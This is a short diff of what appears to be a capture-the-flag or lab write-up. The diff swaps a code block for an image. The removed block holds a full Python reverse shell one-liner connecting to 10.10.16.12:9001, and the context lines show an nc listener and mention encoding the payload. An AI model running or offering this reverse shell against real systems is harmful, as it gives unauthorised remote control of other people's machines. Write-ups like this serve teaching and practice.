@@ -75,9 +75,9 @@ nc -nvlp 9991
 ```
 
 We will make a python reverse shell payload by: <https://www.revshells.com/>
-```
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.12",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
-```
+
+![](/assets/img/posts/1-rev-python.png)
+
 
 Encode it by: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
 ```
